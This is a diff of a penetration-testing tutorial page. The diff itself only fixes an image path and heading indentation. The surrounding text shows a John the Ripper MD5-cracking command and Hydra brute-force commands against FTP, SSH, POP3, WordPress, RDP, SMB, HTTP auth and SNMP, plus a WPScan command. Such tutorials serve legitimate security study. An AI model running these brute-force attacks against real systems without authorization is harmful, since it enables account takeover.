@@ -45,7 +45,7 @@ Now let's try the same attack with ***John
 john --wordlist=rockyou.txt --format=raw-md5 hash.txt
 ```
 
-![JTR](/assets/img/Pass/4_jtr.png)
+![JTR](/assets/img/Pass/jtr.png)
 
 John cracked it in less than a second as well. It's worth noting that if you try to crack it again, you won't get the output as JTR will have stored the cracked hash in the pot file at **/root/.john/john.pot**. You will need to erase the file to crack it again, or cat the file to see the password.
 
@@ -59,47 +59,39 @@ The -t flag specifies the number of threads you are running in the attack. For s
 
 If the service you are attacking is running on a *non-standard* port, you must specify that with the -s flag. ex: ftp is running on port 1021, the end of the attack would look be **ftp -s 1021**
 
-    **FTP**
+**FTP**
 ```shell
 hydra -t 1 -l user -P rockyou.txt -vV $ip ftp
 ```
-
-    **SSH**
+**SSH**
 ```shell
 hydra -v -V -u -l user -P rockyou.txt -t 4 -u $ip ssh
 ```
-
-    **POP3**
+**POP3**
 ```shell
 hydra -l user -P rockyou.txt -f $ip pop3 -V -t 1
 ```
-
-    **Wordpress**
+**Wordpress**
 ```shell
 hydra -l user -P rockyou.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
 ```
-
-    **WPscan for Wordpress**
+**WPscan for Wordpress**
 ```shell
 wpscan --url $ip -U user -P rockyou.txt
 ```
-
-    **Windows RDP**
+**Windows RDP**
 ```shell
 hydra -t 1 -V -f -l user -P rockyou.txt rdp://$ip
 ```
-
-    **SMB**
+**SMB**
 ```shell
 hydra -t 1 -V -f -l user -P rockyou.txt $ip smb
 ```
-
-    **401 Auth**
+**401 Auth**
 ```shell
 hydra -l user -P rockyou.txt $ip http-get /path
 ```
-
-    **SNMP**
+**SNMP**
 ```shell
 hydra -P rockyou.txt -v $ip snmp
 ```
